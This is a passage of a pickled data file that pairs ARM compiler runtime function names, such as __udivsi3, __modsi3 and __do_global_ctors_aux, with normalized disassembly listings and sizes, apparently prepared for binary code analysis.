S'"STR~LR,[SP,-0]\nMOV~R12,R2\nMOV~LR,0\nB~FOO\nADD~LR,LR,0\nLDRB~R3,[LR,R0]\nCMP~R3,0\nBNE~FOO\nMOV~R2,R3\nB~FOO\nADD~R2,R2,0\nLDRB~R3,[R2,R1]\nCMP~R3,0\nBNE~FOO\nCMP~R2,R12\nCMPGE~LR,R12\nBGE~FOO\nB~FOO\nLDRB~R2,[R0]\nLDRB~R3,[R1]\nCMP~R2,R3\nBNE~FOO\nADD~R0,R0,0\nADD~R1,R1,0\nSUBS~R12,R12,0\nBCS~FOO\nMOV~R0,0\nLDR~PC,[SP]\nMOV~R0,0\nLDR~PC,[SP]"'
p365
L120L
tp366
a(S'__udivsi3'
p367
S'"SUBS~R2,R1,0\nMOVEQ~PC,LR\nBCC~FOO\nCMP~R0,R1\nBLS~FOO\nTST~R1,R2\nBEQ~FOO\nTST~R1,0\nMOVEQ~R1,R1,LSL0\nMOVEQ~R3,0\nMOVNE~R3,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nMOVCC~R3,R3,LSL0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nMOVCC~R3,R3,LSL0\nBCC~FOO\nMOV~R2,0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nORRCS~R2,R2,R3\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,0\nMOVNES~R3,R3,LSR0\nMOVNE~R1,R1,LSR0\nBNE~FOO\nMOV~R0,R2\nRET\nMOVEQ~R0,0\nMOVNE~R0,0\nRET\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nMOVCS~R2,0\nMOVCC~R2,0\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nADDCS~R2,R2,0\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nADDCS~R2,R2,0\nCMP~R1,0\nADDHI~R2,R2,0\nADDLS~R2,R2,R1,LSR0\nMOV~R0,R0,LSRR2\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p368
L248L
tp369
a(S'__aeabi_uidivmod'
p370
S'"STMFD~SP!,{R0,R1,LR}\nBL~FOO\nLDMFD~SP!,{R1,R2,LR}\nMUL~R3,R2,R0\nSUB~R1,R1,R3\nRET"'
p371
L24L
tp372
a(S'__umodsi3'
p373
S'"SUBS~R2,R1,0\nBCC~FOO\nCMPNE~R0,R1\nMOVEQ~R0,0\nTSTHI~R1,R2\nANDEQ~R0,R0,R2\nMOVLS~PC,LR\nMOV~R2,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nSUBS~R2,R2,0\nBLT~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,0\nMOV~R1,R1,LSR0\nSUBGES~R2,R2,0\nBGE~FOO\nTST~R2,0\nTEQNE~R0,0\nBEQ~FOO\nCMN~R2,0\nBLT~FOO\nBEQ~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p374
L204L
tp375
a(S'__modsi3'
p376
S'"CMP~R1,0\nBEQ~FOO\nRSBMI~R1,R1,0\nMOVS~R12,R0\nRSBMI~R0,R0,0\nSUBS~R2,R1,0\nCMPNE~R0,R1\nMOVEQ~R0,0\nTSTHI~R1,R2\nANDEQ~R0,R0,R2\nBLS~FOO\nMOV~R2,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nSUBS~R2,R2,0\nBLT~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,0\nMOV~R1,R1,LSR0\nSUBGES~R2,R2,0\nBGE~FOO\nTST~R2,0\nTEQNE~R0,0\nBEQ~FOO\nCMN~R2,0\nBLT~FOO\nBEQ~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R12,0\nRSBMI~R0,R0,0\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p377
L228L
tp378
a(S'__do_global_ctors_aux'
p379
S'"LDR~R3,<STR>\nLDR~R2,[R3,-0]\nCMN~R2,0\nSTMFD~SP!,{R4,LR}\nSUB~R4,R3,0\nLDMEQFD~SP!,{R4,PC}\nMOV~LR,PC\nMOV~PC,R2\nLDR~R2,[R4,-0]\nCMN~R2,0\nBNE~FOO\nLDMFD~SP!,{R4,PC}"'
p380
L48L
tp381
a(S'call___do_global_ctors_aux'
p382
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p383
L8L
tp384
a(S'.term_proc'
p385
S'"MOV~R12,SP\nSTMFD~SP!,{R4-R12,LR,PC}\nSUB~R11,R12,0\nBL~FOO\nLDMDB~R11,{R4-R11,SP,PC}"'
p386
L20L
tp387
a.